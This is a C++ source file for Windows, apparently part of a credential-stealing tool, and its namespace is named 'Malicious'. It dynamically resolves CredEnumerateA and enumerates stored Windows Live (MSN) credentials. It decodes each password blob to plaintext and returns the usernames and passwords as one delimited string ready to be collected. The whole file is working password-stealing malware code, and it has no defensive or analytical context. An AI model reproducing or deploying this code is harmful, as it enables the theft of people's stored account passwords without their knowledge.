#include "Passwords.hpp"
#include <common/Logger.hpp>
#include <windows.h>
#include <wincrypt.h>
#include <wincred.h>
#include <string>

namespace Malicious
{
    using std::string;

    typedef BOOL (WINAPI *typeCredEnumerate)(LPCTSTR, DWORD, DWORD *,PCREDENTIAL **);
    typedef VOID (WINAPI *typeCredFree)(PVOID);

    char * convert(char * szdbOut)
    {
	    const unsigned int SIZE = 50;
        char * szBuffer = new char [SIZE];
	    memset(szBuffer, 0, SIZE);
        int ptrIn=0;
        int ptrOut=0;
        while(true)
        {
		    if (szdbOut[ptrIn] == '\0')
            {
                *(szBuffer + ptrOut) = '\0';
                return szBuffer;
            }

            *(szBuffer + ptrOut) = szdbOut[ptrIn];
            ptrIn += 2;
            ptrOut++;
        }
        return szBuffer;
    }

    string decodeMsnPasswords(char delimiter)
    {
        string passwords;
        PCREDENTIAL *CredentialCollection = 0;
        DWORD dwCount = 0;
        
		HMODULE hAdvapi32DLL = LoadLibrary("advapi32.dll");
        typeCredEnumerate pfCredEnumerate = (typeCredEnumerate)GetProcAddress(hAdvapi32DLL,"CredEnumerateA");
        typeCredFree pfCredFree = (typeCredFree)GetProcAddress(hAdvapi32DLL,"CredFree");
        
        if(pfCredEnumerate("WindowsLive:name=*",0,&dwCount,&CredentialCollection))
        {
            for(DWORD dwTempIndex = 0; dwTempIndex != dwCount; dwTempIndex++)
			{
				const int size = CredentialCollection[dwTempIndex]->CredentialBlobSize;
				char*  mbstr = new char[size];
				memset(mbstr, 0, size);
				wcstombs(mbstr, (const wchar_t*)CredentialCollection[dwTempIndex]->CredentialBlob, size);
				passwords += CredentialCollection[dwTempIndex]->UserName;
				passwords += " => ";
				passwords += mbstr;
				if(dwTempIndex + 1 != dwCount)
				{
					passwords += delimiter;
				}
				delete mbstr;
			}
		}
        pfCredFree(CredentialCollection);
        FreeLibrary(hAdvapi32DLL);
        return passwords;
    }

} // Malicious
